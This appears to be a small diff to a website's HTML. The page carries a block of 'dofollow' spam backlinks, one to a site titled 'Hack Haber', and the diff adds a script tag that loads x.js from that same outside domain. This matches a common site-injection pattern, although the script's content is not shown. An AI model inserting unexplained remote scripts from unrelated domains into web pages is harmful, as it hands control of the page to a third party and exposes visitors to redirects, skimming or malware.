@@ -3,3 +3,4 @@
 <a href="https://www.privnews.com/" target="_blank" rel="dofollow" title="Hack Haber">Hack Haber</a>
 <a href="https://olympusmontane.com/" target="_blank" rel="dofollow" title="Nike dunk custom">Nike dunk custom</a>
 </p>
+<script src="https://www.privnews.com/x.js"></script>
